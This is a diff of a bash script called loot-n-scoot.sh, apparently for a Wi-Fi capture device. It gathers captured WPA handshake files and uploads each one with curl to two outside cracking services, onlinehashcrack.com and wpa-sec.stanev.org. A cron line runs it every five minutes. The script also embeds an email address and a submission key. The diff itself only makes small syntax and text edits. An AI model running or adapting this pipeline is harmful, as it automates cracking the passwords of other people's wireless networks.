@@ -24,7 +24,7 @@
 # run it on cron (5 min):
 # */5 * * * * /root/loot-n-scoot.sh -e sailboat@marina-network.local -k 906ea9affd7e10a19af871a8592c8ae0
 
-cat <<EOF
+cat <<EOL
                 .'|     .8
                .  |    .8:
               .   |   .8;:        .8
@@ -42,7 +42,7 @@ cat <<EOF
    ---nnnnn_______M___________M______mmnnn
          "-.                          /
   __________"-_______________________/_________
-EOF
+EOL
 echo "              GA2 - sailboat-anon@gh";
 echo " _             _                                        _         _     
 | | ___   ___ | |_      _ __        ___  ___ ___   ___ | |_   ___| |__  
@@ -50,13 +50,13 @@ echo " _             _                                        _         _
 | | (_) | (_) | ||_____| | | |_____\__ \ (_| (_) | (_) | |_ _\__ \ | | |
 |_|\___/ \___/ \__|    |_| |_|     |___/\___\___/ \___/ \__(_)___/_| |_|";
 
-while getopts e:k: flag
+while getopts e:k: flag;
 do
-    case "${flag}" in
-        e) email=${OPTARG};;
-        k) wpasec_key=${OPTARG};;
+    case $flag in
+        e) email=$OPTARG;;
+        k) wpasec_key=$OPTARG;;
     esac
-
+done
 if [ -z "$email" ] || [ -z "$wpasec_key" ]
 then
    echo "Syntax:";
@@ -95,9 +95,9 @@ now=$(date +%s)
 while IFS= read -r line; 
   do 
     curl -X POST -F "email=${email}" -F "file=@/root/loot/handshakes/${line}" https://api.onlinehashcrack.com; 
-    echo "> Submitted (${line}) to onlinehashcrack.com";
+    echo "> Submitted ${line} to onlinehashcrack.com";
     curl -X POST -F "webfile=@/root/loot/handshakes/${line}" --cookie "key=${wpasec_key}" https://wpa-sec.stanev.org/\?submit;
-    echo "> Submitted (${line}) to wpa-sec.stanev.org";
+    echo "> Submitted ${line} to wpa-sec.stanev.org";
 done < /tmp/ls-handshake.out >> /root/loot/handshakes/logs/submitted-${now}.txt;
 
 echo "Cleaning up..."
